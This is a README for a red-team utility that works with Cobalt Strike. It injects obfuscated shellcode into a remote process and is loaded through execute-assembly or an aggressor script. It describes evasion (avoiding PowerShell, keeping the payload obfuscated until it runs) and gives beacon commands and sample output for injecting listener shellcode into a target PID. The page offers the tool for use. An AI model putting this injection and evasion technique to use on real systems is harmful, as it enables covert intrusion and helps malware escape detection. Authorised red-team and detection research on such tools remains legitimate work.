# RemoteProcessInjection

C# remote process injection utility for Cobalt Strike. The idea is to perform process injection without spawning Powershell and also use a custom obfuscated shellcode payload.

# What it does

This utility is designed to use Cobalt Strike `execute-assembly` functionality to inject shellcode into a remote process. The injected shellcode is automatically obfuscated with a simple inline decoder written in assembly.

When the call to `CreateRemoteThread` happen the payload is still obfuscated since the decoder is part of the final shellcode. 

# Usage

### Using the C# utlity as a standalone tool

Within a beacon it can be executed using the following command.

```
execute-assembly /path/RemoteInject.exe PID eW91cnNoZWxsY29kZQo=
```

### Using the Cobalt Strike aggressor script

1. Clone the repository into your Cobalt Strike installation folder.

2. Load the injector.cna script into Cobalt Strike scripts manager.

When you have a beacon simply type `injector` or `help injector`

```
beacon> injector 4811 http x86
[+] Generating x86 shellcode for http listener.
[+] Injecting the obfuscated shellcode into process with PID: 4811
[+] Process completed.
```

# Credit

Mr.Un1k0d3r RingZer0 Team
MBergeron
